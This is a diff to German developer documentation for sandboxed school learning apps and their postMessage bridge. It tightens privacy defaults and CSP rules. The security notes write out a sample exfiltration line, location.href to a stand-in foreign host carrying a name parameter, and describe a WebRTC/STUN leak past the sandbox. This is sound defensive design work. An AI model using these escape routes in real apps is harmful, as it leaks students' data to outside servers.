@@ -99,7 +99,7 @@ Ergebnisse bleiben.
 | `unit` | Abschnitt, mit dem die App starten soll, oder `null` |
 | `enabledUnits` | Abschnitte, die diese Klasse hat, `null` ohne Einschränkung |
 | `state` | zuletzt gespeicherter Stand oder `null` |
-| `displayName` | Name des Schülers für Anzeige und Ausdruck, oder `null` |
+| `displayName` | `null`, solange es keine ausdrückliche Einstellung dafür gibt: Die App soll keine Schülerdaten kennen |
 
 ## Regeln für die Auswertung
 
@@ -136,12 +136,13 @@ Klasse bleibt der Stand nur auf dem Gerät.
 **Geht:** Skripte und Stile in der Datei, Bilder und Schriften als `data:`, Formulare,
 `confirm()`, `print()`, Dateien herunterladen (`<a download>`, `Blob`).
 
-**Geht nicht** (im Browser geprüft, außer `print()` und dem Herunterladen):
+**Geht nicht** (in Chrome geprüft, außer `print()` und dem Herunterladen; Safari auf dem iPad steht noch aus):
 
 | Nicht möglich | Stattdessen |
 |---|---|
 | `localStorage`, Cookies | `LM.saveState`; Zugriffe in `try/catch` setzen, sie werfen `SecurityError` |
 | `fetch`, Bilder oder Skripte von außen, CDNs, KI-Dienste | alles in die Datei packen |
+| Wechsel zu einer anderen Adresse, auch über Links, neue Fenster | keine externen Links in der App |
 | Zugriff auf die umgebende Seite, Anmeldung, Schülerdaten | nur die Felder aus `init` |
 
 ## Wenn nichts ankommt
@@ -234,6 +235,7 @@ Die Bridge ist nur eine Hülle um `postMessage`. Nachrichten sehen so aus:
 
 - Der Rahmen nimmt nur Nachrichten an, deren `event.source` das eigene iframe ist. Der Ursprung ist `null`, er taugt nicht zur Prüfung.
 - Er prüft Felder und Größen selbst und sendet mit dem Schülerausweis an den Server. Die App sieht den Ausweis nie.
+- Inhalte aus Steckbrief und Meldungen (`title`, `label` …) sind fremder Text: überall escapen.
 - Ausgeliefert wird die Datei auf einer eigenen Adresse mit diesem Kopf:
 
 ```text
@@ -241,3 +243,12 @@ Content-Security-Policy: sandbox allow-scripts allow-modals allow-downloads allo
   default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:;
   font-src data:; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'
 ```
+
+- **Das reicht allein nicht:** `connect-src` hält keinen Seitenwechsel auf. Ohne weiteren Schutz
+  sendet `location.href = 'https://fremd/?name=…'` Daten nach außen (in Chrome nachgewiesen). Die Seite
+  mit dem iframe muss deshalb `Content-Security-Policy: frame-src 'self'` tragen; damit kam im Test
+  nichts mehr an. Die Hauptseite bettet auch fremde Inhalte ein, also braucht die App eine eigene
+  Rahmenseite oder Subdomain.
+- **Offener Rest:** `RTCPeerConnection` erreicht fremde Server auch mit `webrtc 'block'` (in Chrome
+  kamen STUN-Pakete an). Eine böswillige App kann also, was sie weiß, nach außen tragen. Deshalb gibt
+  der Rahmen ihr so wenig wie möglich mit; siehe `displayName`.
